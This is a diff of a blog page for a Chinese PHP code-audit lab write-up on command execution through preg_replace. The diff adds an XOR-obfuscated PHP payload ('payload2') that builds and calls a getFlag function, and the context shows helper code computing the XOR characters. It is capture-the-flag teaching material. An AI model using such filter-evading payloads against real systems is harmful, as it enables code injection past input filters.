@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day8/2.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day8/3.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day8/4.png">
-<meta property="og:updated_time" content="2018-10-02T15:14:46.101Z">
+<meta property="og:updated_time" content="2018-10-02T15:26:01.710Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP代码审计-preg_replace函数命令执行">
 <meta name="twitter:description" content="前言 preg_replace这个函数的问题很大，今天再来扒一扒。">
@@ -342,7 +342,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">1,295字</span>
+			<span class="post-count">1,303字</span>
 		</span>
 	</span>
 	
@@ -427,7 +427,7 @@
 <p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day8/2.png" alt=""></p>
 <p>另一种就是直接构造getFlag</p>
 <p><strong>payload2：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$哼=&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^%1C%1E%0F%3D%17%1A%1C&quot;;$哼();</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day8/3.png" alt=""></p>
 <p>至于为什么这样异或能构造getFlag，是可以通过代码实现的，这里也给出源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = str_split(<span class="string">'getFlag'</span>);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++)&#123;</span><br><span class="line">    $ch = <span class="string">'&#123;'</span>^ chr($i);</span><br><span class="line">    <span class="keyword">if</span> (in_array($ch, $a , <span class="keyword">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123; ^ chr("</span>.$i.<span class="string">") = $ch&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;&#123;&#123;&#123;&#123;&#123;&#123;"</span>^chr(<span class="number">28</span>).chr(<span class="number">30</span>).chr(<span class="number">15</span>).chr(<span class="number">61</span>).chr(<span class="number">23</span>).chr(<span class="number">26</span>).chr(<span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -450,7 +450,7 @@
         <p><span>本文标题:</span><a href="/2018/10/02/PHP-Audit-Labs-Day8/">PHP代码审计-preg_replace函数命令执行</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
         <p><span>发布时间:</span>2018-10-02, 19:43:31</p>
-        <p><span>最后更新:</span>2018-10-02, 23:14:46</p>
+        <p><span>最后更新:</span>2018-10-02, 23:26:01</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/10/02/PHP-Audit-Labs-Day8/" title="PHP代码审计-preg_replace函数命令执行">http://yoursite.com/2018/10/02/PHP-Audit-Labs-Day8/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/02/PHP-Audit-Labs-Day8/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
